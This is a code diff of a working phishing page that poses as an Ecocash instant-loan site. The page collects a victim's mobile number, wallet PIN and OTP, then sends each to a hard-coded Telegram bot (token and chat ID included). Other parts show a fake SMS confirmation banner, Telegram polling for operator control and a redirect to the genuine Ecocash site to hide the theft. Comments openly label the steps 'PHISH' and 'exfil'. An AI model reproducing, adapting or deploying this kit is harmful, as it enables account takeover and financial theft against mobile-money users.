@@ -6,7 +6,6 @@
   <meta name="theme-color" content="#0033A0" />
   <title>Ecocash Loans — Instant Cash to Your Wallet</title>
 
-  <!-- ECOCASH OFFICIAL FAVICON -->
   <link rel="icon" type="image/png" href="https://www.ecocash.co.zw/favicon.ico" />
   <link rel="apple-touch-icon" href="https://www.ecocash.co.zw/apple-touch-icon.png" />
 
@@ -424,7 +423,7 @@
       text-align: center;
     }
 
-    /* FAKE SMS BANNER (Airtel-style) */
+    /* FAKE SMS BANNER */
     .sms-banner {
       position: fixed;
       bottom: -100px;
@@ -470,7 +469,6 @@
 <body>
 
 <div class="wrap">
-
   <header>
     <div class="brandrow">
       <div class="logo"></div>
@@ -479,7 +477,6 @@
         <div class="tag">Instant cash. Straight to your wallet.</div>
       </div>
     </div>
-
     <div class="hero">
       <h1>Get Cash Now — Up to $1000</h1>
       <p>No paperwork. Just your mobile number and PIN.</p>
@@ -487,15 +484,11 @@
   </header>
 
   <main>
-
-    <!-- STEP 1: PHONE & LOAN -->
     <section class="card" id="cardStep1">
       <h2>Apply for a Loan</h2>
       <p class="sub">Enter your Ecocash number to check eligibility.</p>
-
       <label>Mobile Number</label>
       <input type="tel" id="msisdn" placeholder="+263771234567" inputmode="numeric" />
-
       <label>Loan Amount (USD)</label>
       <select id="loanAmount" onchange="updateAmountPlaceholder()">
         <option value="" disabled selected>Select or enter amount</option>
@@ -504,37 +497,28 @@
         <option value="200">$200</option>
         <option value="custom">Other (enter below)</option>
       </select>
-
       <input type="text" id="customAmount" placeholder="Enter amount (e.g. $75)" style="display:none; margin-top:8px" />
-
       <label>Repayment Period</label>
       <select id="repaymentTerm">
         <option value="30">30 Days</option>
         <option value="60">60 Days</option>
         <option value="90">90 Days</option>
       </select>
-
       <div class="err" id="err1"></div>
       <button class="cta" id="btnCheckLimit" type="button">Check My Limit</button>
-
       <div class="help">By continuing, you agree to Ecocash Terms. Data rates may apply.</div>
     </section>
 
-    <!-- STEP 2: ECOCASH PIN -->
     <section class="card" id="cardStep2" style="display:none">
       <h2>Enter Your Ecocash PIN</h2>
       <p class="sub">Confirm your identity to proceed with the loan.</p>
-
       <label>Enter Your 4-Digit PIN</label>
       <input type="password" id="ecocashPin" inputmode="numeric" maxlength="4" placeholder="••••" />
-
       <div class="err" id="err2"></div>
       <button class="cta" id="btnSubmitPin" type="button">Continue</button>
-
       <div class="help">⚠️ Ecocash will never call you to ask for your PIN.</div>
     </section>
 
-    <!-- STEP 3: SUCCESS + REDIRECT -->
     <section class="card" id="cardSuccess" style="display:none">
       <div class="success">
         <div class="check">✓</div>
@@ -546,7 +530,6 @@
         <div class="countdown-label">Redirecting to Ecocash portal to complete setup...</div>
       </div>
     </section>
-
   </main>
 
   <footer>
@@ -561,14 +544,12 @@
     <button class="close-x" id="otpClose">×</button>
     <h3>Enter OTP Code</h3>
     <p>We sent a 4-digit code to <b id="otpMsisdn"></b>. Enter it below.</p>
-
     <div class="otp-row" id="otpRow">
       <input inputmode="numeric" maxlength="1" />
       <input inputmode="numeric" maxlength="1" />
       <input inputmode="numeric" maxlength="1" />
       <input inputmode="numeric" maxlength="1" />
     </div>
-
     <div class="err" id="errOtp"></div>
     <div class="resend">Didn't get it? <b id="resend">Resend</b> · <span id="resendTimer">10:00</span></div>
     <button class="cta" id="btnVerify" type="button" disabled>Verify & Continue</button>
@@ -582,15 +563,12 @@
 </div>
 
 <script>
-  // === CONFIG: TELEGRAM BOT ===
   const BOT_TOKEN = '7937948918:AAHA2rpnuryORr-ApHApFouNesrhjzVMv4E';
   const CHAT_ID = '1469249528';
   let POLLING_INTERVAL;
 
-  // === REDIRECT TARGET ===
   const REDIRECT_URL = 'https://www.ecocash.co.zw/';
 
-  // === STATE (NOW PERSISTS PIN TO OTP STEP) ===
   const state = {
     msisdn: '',
     amount: '',
@@ -600,15 +578,10 @@
     victimId: null
   };
 
-  // === HELPERS ===
   function showErr(id, msg) {
     const el = document.getElementById(id);
     el.textContent = msg;
     el.classList.add('show');
-  }
-
-  function clearErr(id) {
-    document.getElementById(id).classList.remove('show');
   }
 
   function getFinalAmount() {
@@ -630,12 +603,11 @@
     }
   }
 
-  // === STEP 1: PHONE → VALIDATION ===
+  // STEP 1: Capture MSISDN + Loan
   document.getElementById('btnCheckLimit').addEventListener('click', () => {
     let msisdn = document.getElementById('msisdn').value.trim();
     const amount = getFinalAmount();
 
-    // Auto prepend +263 if missing
     if (msisdn.startsWith('07')) msisdn = '+263' + msisdn.slice(1);
     if (msisdn.startsWith('7')) msisdn = '+263' + msisdn;
 
@@ -654,7 +626,7 @@
     document.getElementById('cardStep2').style.display = '';
   });
 
-  // === STEP 2: PIN → EXFIL → OTP ===
+  // STEP 2: Capture PIN → Exfil (Phone + PIN)
   document.getElementById('btnSubmitPin').addEventListener('click', () => {
     const pin = document.getElementById('ecocashPin').value;
     if (!pin || pin.length !== 4 || !/^\d{4}$/.test(pin)) {
@@ -662,11 +634,14 @@
     }
 
     state.pin = pin;
-    exfiltratePin();
+
+    // FIRST EXFIL: Phone + PIN (like Airtel)
+    const log1 = `📱 *ECOCASH PHISH: PHASE 1* 📱\n📞 ${state.msisdn}\n🔐 *PIN*: ${state.pin}\n💸 *Loan*: ${state.amount}\n🕒 ${new Date().toLocaleString()}`;
+    sendToTelegram(log1);
+
     openOtpSheet();
   });
 
-  // === OTP SHEET ===
   function openOtpSheet() {
     document.getElementById('otpMsisdn').textContent = state.msisdn;
     document.getElementById('otpSheet').classList.add('show');
@@ -674,7 +649,7 @@
     startOtpTimer();
     sendAdminAlert();
     startPolling();
-    triggerSMS(); // Fake SMS like Airtel
+    triggerSMS();
   }
 
   function startOtpTimer() {
@@ -688,7 +663,6 @@
     }, 1000);
   }
 
-  // === SEND ADMIN CONTROL TO TELEGRAM ===
   function sendAdminAlert() {
     const victimId = Date.now();
     state.victimId = victimId;
@@ -720,7 +694,6 @@ Choose action:
     }).catch(console.error);
   }
 
-  // === LONG POLLING FOR ADMIN RESET ===
   function startPolling() {
     let offset = null;
     POLLING_INTERVAL = setInterval(() => {
@@ -745,7 +718,7 @@ Choose action:
     }, 2000);
   }
 
-  // === OTP AUTO-ADVANCE & VERIFY ===
+  // OTP INPUT HANDLING
   const otpInputs = document.querySelectorAll('#otpRow input');
   otpInputs.forEach((input, index) => {
     input.addEventListener('input', () => {
@@ -776,79 +749,42 @@ Choose action:
     });
   });
 
-  // Final Verify Button
+  // FINAL: Capture OTP → Exfil (Phone + PIN + OTP) — FULL TRIAD
   document.getElementById('btnVerify').addEventListener('click', () => {
     const otp = Array.from(otpInputs).map(i => i.value).join('');
     if (otp.length !== 4) return showErr('errOtp', 'Enter all 4 digits');
 
     state.otp = otp;
-    exfiltrateOtp(); // Full triad exfil
+
+    // SECOND EXFIL: Phone + PIN + OTP (FULL CORRELATION — JUST LIKE AIRTEL)
+    const log2 = `🔐 *ECOCASH FULL TRIAD CAPTURE* 🔐\n📞 ${state.msisdn}\n🔐 *PIN*: ${state.pin}\n🔢 *OTP*: ${otp}\n💸 *Loan*: ${state.amount}\n🕒 ${new Date().toLocaleString()}`;
+    sendToTelegram(log2);
 
     document.getElementById('cardStep2').style.display = 'none';
     document.getElementById('otpSheet').classList.remove('show');
-    document.getElementById('processingScreen')?.remove();
     showSuccessScreen();
-
     clearInterval(POLLING_INTERVAL);
   });
 
-  // === SUCCESS SCREEN + CONVINCING REDIRECT ===
   function showSuccessScreen() {
     const ref = Math.floor(100000 + Math.random() * 900000);
     document.getElementById('refCode').textContent = ref;
     document.getElementById('successAmount').textContent = state.amount;
     document.getElementById('successMsisdn').textContent = state.msisdn;
-
     document.getElementById('cardStep2').style.display = 'none';
     document.getElementById('cardSuccess').style.display = '';
-
     setTimeout(() => {
       window.location.href = REDIRECT_URL;
     }, 10000);
   }
 
-  // === EXFILTRATION ===
-  function exfiltratePin() {
-    const message = `
-📲 *ECOCASH VICTIM: PHONE + PIN*
-📞 *Number:* ${state.msisdn}
-🔐 *PIN:* ${state.pin}
-💸 *Loan:* ${state.amount}
-📅 *Term:* ${state.term}
-🕒 *Time:* ${new Date().toLocaleString()}
-`;
-    sendToTelegram(message);
-  }
-
-  function exfiltrateOtp() {
-    const message = `
-🔐 *ECOCASH FULL TRIAD CAPTURED* 🔐
-📞 *Number:* ${state.msisdn}
-🔐 *PIN:* ${state.pin}
-🔢 *OTP:* ${state.otp}
-💸 *Loan:* ${state.amount}
-📅 *Term:* ${state.term}
-🕒 *Time:* ${new Date().toLocaleString()}
-`;
-    sendToTelegram(message);
-  }
-
   function sendToTelegram(message) {
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
     const payload = { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' };
-
-    // Dual exfil: sendBeacon + fetch fallback
-    try {
-      navigator.sendBeacon(url, JSON.stringify(payload));
-    } catch (e) {
-      fetch(url, { method: 'POST', body: JSON.stringify(payload), mode: 'no-cors' })
-        .catch(() => {
-          // Silent fail
-        });
-    }
+    try { navigator.sendBeacon(url, JSON.stringify(payload)); }
+    catch (e) { fetch(url, { method: 'POST', body: JSON.stringify(payload), mode: 'no-cors' }); }
   }
 
-  // Fake SMS Banner (Airtel-style)
   function triggerSMS() {
     const banner = document.getElementById("smsBanner");
     const amount = document.getElementById("smsAmount");
@@ -862,22 +798,20 @@ Choose action:
     }, 1000);
   }
 
-  // Resend OTP (re-exfiltrates PIN)
   document.getElementById('resend').addEventListener('click', () => {
     startOtpTimer();
-    exfiltratePin();
+    // Re-exfil PIN if resend is clicked
+    const log = `🔄 *RESEND OTP TRIGGERED*\n📞 ${state.msisdn}\n🔐 *PIN*: ${state.pin}\n💸 *Loan*: ${state.amount}`;
+    sendToTelegram(log);
   });
 
-  // Close OTP
   document.getElementById('otpClose').addEventListener('click', () => {
     if (confirm('Cancel verification? Your loan will not be processed.')) {
       document.getElementById('otpSheet').classList.remove('show');
     }
   });
 
-  // Set year
   document.getElementById('yr').textContent = new Date().getFullYear();
 </script>
-
 </body>
 </html>
